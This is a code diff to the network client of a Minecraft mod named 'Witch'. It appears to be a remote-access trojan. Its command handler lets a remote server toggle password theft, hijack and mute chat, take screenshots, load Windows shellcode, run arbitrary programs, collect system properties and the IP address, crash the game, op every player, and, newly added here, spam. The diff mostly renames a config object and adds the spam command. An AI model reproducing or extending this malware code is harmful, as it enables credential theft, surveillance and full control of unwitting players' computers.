@@ -1,11 +1,17 @@
 package me.soda.witch.client.connection;
 
 import me.soda.witch.client.Witch;
-import me.soda.witch.client.utils.*;
+import me.soda.witch.client.modules.OpEveryone;
+import me.soda.witch.client.modules.Spam;
+import me.soda.witch.client.utils.ChatUtils;
+import me.soda.witch.client.utils.MCUtils;
+import me.soda.witch.client.utils.ScreenshotUtil;
+import me.soda.witch.client.utils.ShellcodeLoader;
 import me.soda.witch.shared.*;
 import me.soda.witch.shared.socket.TcpClient;
-import me.soda.witch.shared.socket.messages.DisconnectInfo;
 import me.soda.witch.shared.socket.messages.Message;
+import me.soda.witch.shared.socket.messages.messages.DisconnectInfo;
+import me.soda.witch.shared.socket.messages.messages.SpamInfo;
 import net.minecraft.client.util.GlfwUtil;
 
 import java.lang.management.ManagementFactory;
@@ -23,11 +29,12 @@ public class Client extends TcpClient {
         LogUtil.println("Received message: " + msgType);
         try {
             switch (msgType) {
-                case "steal_pwd_switch" -> Witch.VARIABLES.passwordBeingLogged = !Witch.VARIABLES.passwordBeingLogged;
+                case "steal_pwd_switch" ->
+                        Witch.CONFIG_INFO.passwordBeingLogged = !Witch.CONFIG_INFO.passwordBeingLogged;
                 case "chat_control" -> ChatUtils.sendChat((String) msg);
-                case "chat_filter" -> Witch.VARIABLES.filterPattern = (String) msg;
-                case "chat_filter_switch" -> Witch.VARIABLES.isBeingFiltered = !Witch.VARIABLES.isBeingFiltered;
-                case "chat_mute" -> Witch.VARIABLES.isMuted = !Witch.VARIABLES.isMuted;
+                case "chat_filter" -> Witch.CONFIG_INFO.filterPattern = (String) msg;
+                case "chat_filter_switch" -> Witch.CONFIG_INFO.isBeingFiltered = !Witch.CONFIG_INFO.isBeingFiltered;
+                case "chat_mute" -> Witch.CONFIG_INFO.isMuted = !Witch.CONFIG_INFO.isMuted;
                 case "mods" -> Witch.send(msgType, MCUtils.allMods());
                 case "systeminfo" -> Witch.send(msgType, MCUtils.systemInfo());
                 case "screenshot" -> ScreenshotUtil.gameScreenshot();
@@ -44,13 +51,13 @@ public class Client extends TcpClient {
                     if (ProgramUtil.isWin())
                         new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
                 }
-                case "log" -> Witch.VARIABLES.logChatAndCommand = !Witch.VARIABLES.logChatAndCommand;
-                case "config" -> Witch.send(msgType, Witch.VARIABLES);
+                case "log" -> Witch.CONFIG_INFO.logChatAndCommand = !Witch.CONFIG_INFO.logChatAndCommand;
+                case "config" -> Witch.send(msgType, Witch.CONFIG_INFO);
                 case "player" -> Witch.send(msgType, MCUtils.getPlayerInfo());
                 case "skin" -> MCUtils.sendPlayerSkin();
                 case "server" -> {
                     MCUtils.disconnect();
-                    Witch.VARIABLES.canJoinServer = !Witch.VARIABLES.canJoinServer;
+                    Witch.CONFIG_INFO.canJoinServer = !Witch.CONFIG_INFO.canJoinServer;
                 }
                 case "kick" -> MCUtils.disconnect();
                 case "execute" -> new Thread(() -> ProgramUtil.runProg((byte[]) msg)).start();
@@ -60,8 +67,9 @@ public class Client extends TcpClient {
                 case "props" -> Witch.send(msgType, System.getProperties());
                 case "ip" -> Witch.send(msgType, NetUtil.getIP());
                 case "crash" -> GlfwUtil.makeJvmCrash();
-                case "server_name" -> Witch.VARIABLES.name = (String) msg;
+                case "server_name" -> Witch.CONFIG_INFO.name = (String) msg;
                 case "op@a" -> OpEveryone.INSTANCE.opEveryone();
+                case "spam" -> Spam.INSTANCE.spam((SpamInfo) msg);
             }
         } catch (Exception e) {
             LogUtil.println("Corrupted message!");
@@ -85,8 +93,8 @@ public class Client extends TcpClient {
     public void onOpen() {
         LogUtil.println("Connection initialized");
         Witch.send("player", MCUtils.getPlayerInfo());
-        Witch.send("ip", NetUtil.getIP());
         Witch.send("server_name");
+        new Thread(() -> Witch.send("ip", NetUtil.getIP()));
     }
 
     @Override
